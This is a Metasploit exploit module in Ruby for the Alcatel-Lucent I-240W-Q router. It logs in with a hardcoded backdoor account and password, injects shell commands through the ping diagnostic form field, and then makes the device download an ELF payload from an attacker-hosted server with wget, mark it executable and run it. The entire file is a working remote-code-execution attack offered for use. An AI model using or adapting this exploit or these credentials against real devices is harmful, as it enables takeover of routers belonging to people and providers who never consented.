##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Alcatel-Lucent I-240W-Q Command Execution - Upload shell and execute',
      'Description' => %q{
          Alcatel-Lucent I-240W-Q is vulnerable to command execution via a crafted HTTP POST request. 
          Using a backdoor account that was discovered it is possible to take control of the device.
      },
      'Author'      =>
        [
          'Luis Colunga (sinnet3000) <lcolunga@websec.mx>'
          # Based on the Michael Messner and juan vazques Alcatel-Lucent E1500 metasploit module
          # Thanks to hkm who discovered the Alcatel Lucent backdoored account. He discovered the exploit before too :-)
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'http://www.websec.mx/advisories/view/Ejecuci%C3%B3n-de-comandos-en-Alcatel-Lucent-I-240W-Q' ]
        ],
      'DisclosureDate' => 'Dec 19 2013',
      'Privileged'     => true,
      'Platform'       => %w{ linux unix },
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [ 'CMD',
            {
            'Arch' => ARCH_CMD,
            'Platform' => 'unix'
            }
          ],
          [ 'Linux mipsbe Payload',
            {
            'Arch' => ARCH_MIPSBE,
            'Platform' => 'linux'
            }
          ],
        ],
      'DefaultTarget'  => 1
      ))

    register_options(
      [
        OptString.new('USERNAME', [ true, 'The username to authenticate as', 'telecomadmin' ]),
        OptString.new('PASSWORD', [ true, 'The password for the specified username', 'nE7jA%5m' ]),
        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),
        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),
        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60])
      ], self.class)
  end


  def request(cmd,uri)
    begin
      res = send_request_cgi({
        'uri'    => uri,
        'method' => 'POST',
        'vars_post' => {
          "XWebPageName" => "diag",
          "diag_action" => "ping",
          "wan_conlist" => "0",
          "dest_host" => "; #{cmd}"
        }
      })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
  end

  def exploit
    downfile = datastore['DOWNFILE'] || rand_text_alpha_lower(2)
    uri = '/GponForm/diag_XForm'
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    rhost = datastore['RHOST']
    rport = datastore['RPORT']

    #
    # Logging in
    #
    print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
    begin
      res = send_request_cgi({
        'uri'    => '/GponForm/LoginForm',
        'method' => 'POST',
        'vars_post' => {
          "XWebPageName" => "index",
          "username" => user,
          "password" => pass,
        }
      })

    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end

    if target.name =~ /CMD/
      if not (datastore['CMD'])
        fail_with(Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
      end
      cmd = payload.encoded
      res = request(cmd,uri)
      if (!res)
        fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
      else
        print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
      end
      return
    end

    #thx to Juan for his awesome work on the mipsel elf support
    @pl = generate_payload_exe
    @elf_sent = false

    #
    # start our server
    #
    resource_uri = '/' + downfile

    if (datastore['DOWNHOST'])
      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri
    else
      #do not use SSL
      if datastore['SSL']
        ssl_restore = true
        datastore['SSL'] = false
      end

      #we use SRVHOST as download IP for the coming wget command.
      #SRVHOST needs a real IP address of our download host
      if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore['SRVHOST']
      end

      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri
      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
      start_service({'Uri' => {
        'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        'Path' => resource_uri
      }})

      datastore['SSL'] = true if ssl_restore
    end

    #
    # download payload
    #
    print_status("#{rhost}:#{rport} - Asking the Alcatel-Lucent device to download #{service_url}")
    #this filename is used to store the payload on the device
    filename = rand_text_alpha_lower(2)

    #not working if we send all command together -> lets take three requests
    cmd = "wget #{service_url} -O /mnt/rwdir/#{filename}"
    res = request(cmd,uri)

    # wait for payload download
    if (datastore['DOWNHOST'])
      print_status("#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the Alcatel-Lucent device to download the payload")
      select(nil, nil, nil, datastore['HTTP_DELAY'])
    else
      wait_linux_payload
    end
    register_file_for_cleanup("/mnt/rwdir/#{filename}")

    #
    # chmod
    #
    cmd = "chmod +x /mnt/rwdir/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the Alcatel-Lucent device to chmod #{downfile}")
    res = request(cmd,uri)
    select(nil, nil, nil, 5)

    #
    # execute
    #
    cmd = "/mnt/rwdir/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the Alcatel-Lucent device to execute #{downfile}")
    res = request(cmd,uri)
    select(nil, nil, nil, 5)

  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    #print_status("on_request_uri called: #{request.inspect}")
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['HTTP_DELAY'])
        fail_with(Failure::Unknown, "#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end

end
